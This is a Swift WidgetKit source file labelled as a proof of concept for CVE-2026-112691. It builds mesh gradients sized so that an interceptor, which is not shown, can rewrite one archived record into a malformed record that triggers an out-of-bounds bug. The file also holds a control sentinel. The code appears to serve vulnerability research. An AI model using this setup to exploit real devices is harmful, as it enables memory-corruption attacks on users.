//
//  MeshGradientOOBWidget.swift
//  MeshGradientOOB
//
//  PoC for CVE-2026-112691.
//

import SwiftUI
import WidgetKit

private struct Entry: TimelineEntry {
    let date: Date
}

private struct Provider: TimelineProvider {
    func placeholder(in context: Context) -> Entry {
        Entry(date: .now)
    }

    func getSnapshot(in context: Context, completion: @escaping (Entry) -> Void) {
        completion(Entry(date: .now))
    }

    func getTimeline(in context: Context, completion: @escaping (Timeline<Entry>) -> Void) {
        completion(Timeline(entries: [Entry(date: .now)],
                            policy: .after(.now.addingTimeInterval(1800))))
    }
}

// Two mesh gradients whose archived records the interceptor can reach.
// `retained` keeps a same-type record in the archive; `visible` (2x2, four
// colors) is archived as exactly the 70-byte record that the positive
// rewrite turns into the malformed type 6 record.
private struct MeshCanvas: View {
    var body: some View {
        Canvas { context, size in
            let bounds = Path(CGRect(origin: .zero, size: size))
            let retained = MeshGradient(
                width: 3,
                height: 2,
                points: [
                    SIMD2<Float>(0, 0), SIMD2<Float>(0.5, 0), SIMD2<Float>(1, 0),
                    SIMD2<Float>(0, 1), SIMD2<Float>(0.5, 1), SIMD2<Float>(1, 1),
                ],
                colors: [.red, .green, .blue, .yellow, .red, .green]
            )
            let visible = MeshGradient(
                width: 2,
                height: 2,
                points: [
                    SIMD2<Float>(0, 0), SIMD2<Float>(1, 0),
                    SIMD2<Float>(0, 1), SIMD2<Float>(1, 1),
                ],
                colors: [.red, .green, .blue, .yellow]
            )
            var filter = ColorMatrix()
            filter.r5 = 0.03125
            filter.g5 = 0.0625
            filter.b5 = 0.125

            context.drawLayer { layer in
                layer.addFilter(.colorMatrix(filter))
                layer.fill(bounds, with: .meshGradient(retained))
                layer.fill(bounds, with: .meshGradient(visible))
            }
        }
    }
}

private struct ContentView: View {
    let entry: Entry

    var body: some View {
        VStack(alignment: .leading, spacing: 8) {
            Text("MeshGradientOOB")
                .font(.headline)

            // The sentinel is archived verbatim. The safe-control rewrite
            // replaces it with a same-length marker, which renders here.
            Text(verbatim: MGOOBControlSentinel)
                .font(.caption2.monospaced())
                .lineLimit(3)

            MeshCanvas()
                .frame(height: 24)

            Text(entry.date, style: .time)
                .font(.caption)
        }
        .containerBackground(.fill.tertiary, for: .widget)
    }
}

private struct MeshGradientOOBWidget: Widget {
    let kind = "com.licht.meshgradientoob.widget"

    var body: some WidgetConfiguration {
        StaticConfiguration(kind: kind, provider: Provider()) { entry in
            ContentView(entry: entry)
        }
        .configurationDisplayName("MeshGradientOOB")
        .description("Archives two mesh gradients and a text sentinel through the production timeline path.")
        .supportedFamilies([.systemSmall, .systemMedium])
    }
}

@main
private struct MeshGradientOOBWidgetBundle: WidgetBundle {
    var body: some Widget {
        MeshGradientOOBWidget()
    }
}
